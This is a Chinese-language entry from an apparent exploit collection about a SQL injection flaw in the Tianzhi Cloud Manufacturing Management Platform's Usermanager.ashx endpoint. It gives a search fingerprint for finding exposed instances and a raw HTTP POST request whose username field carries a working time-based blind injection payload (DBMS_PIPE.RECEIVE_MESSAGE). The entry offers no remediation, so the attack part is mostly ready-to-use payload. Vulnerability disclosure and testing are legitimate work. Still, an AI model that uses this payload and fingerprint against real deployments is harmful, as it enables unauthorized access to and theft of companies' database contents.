---
source: "wy876 漏洞文库"
---

# 天智云制造管理平台存在SQL注入漏洞

# 一、漏洞简介
天智(苏州)智能系统有限公司天智云制造管理平台是一款专注于中小企业智能化生产管理的SaaS软件。该平台通过一站式服务串联销售、采购、生产、质量和仓库等部门，实现生产全过程的数字化管理。它具备生产管理、订单管理、质量追溯、仓库管理等多项功能，并通过移动化、可配置的方式，满足企业个性化需求。天智云制造管理平台致力于提高生产效率、降低生产成本、提升产品质量，帮助中小企业实现数智化转型。天智云制造管理平台是一款专注于中小企业智能化生产管理的SaaS软件。该系统 Usermanager.ashx 存在sql注入漏洞，攻击者可获取数据库敏感信息。

# 二、影响版本
+ 天智云制造管理平台


# 三、资产测绘
```plain
body="Ashx/Usermanager.ashx"
```

# 四、漏洞复现
```rust
POST /Ashx/Usermanager.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

type=LOGIN&username=1') AND 1566=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(90)||CHR(98)||CHR(107),5) AND ('DgMy'='DgMy&pwd=123&vendor=
```


```rust
POST /Ashx/Usermanager.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

type=LOGIN&username=1&pwd=123&vendor=
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/suc76y4muoeqbtkp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
